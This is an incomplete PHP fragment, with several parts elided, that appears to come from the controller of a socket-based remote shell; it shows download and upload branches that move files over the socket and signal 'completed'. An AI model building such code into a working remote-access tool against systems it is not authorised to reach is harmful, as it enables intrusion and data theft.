...
while(true){
    ...
    if(strpos($terminate,$input) !== false){
        ...
        $fh = fopen("shellDownload".$filename,"wb");
        $fileData = socket_read($spawn,1024);
        while(!strpos($fileData,"completed")){
            if(strpos($fileData,"completed") !== false){
                break;
            }else{
                fwrite($fh,$fileData);
                $fileData = socket_read($spawn,1024);
    ...
    }else if(strpos($input,"upload") !== false){
        preg_match("/^\s*upload\s+(.+)\s*(2>&1)?$/", $input,$match);
        if(file_exists($match[1])){
            ...
            while($fileData){
                socket_write($spawn,$fileData,1024);            
                $fileData = fread($fh,1024);
            }
            fclose($fh);
            $completed = "completed";
            socket_write($spawn,$completed,strlen($completed)) ;
            echo "file read end\n";

            // $checkCompleteClient = socket_read($spawn,13421000);
            // if(strpos($checkCompleteClient,"completed")){
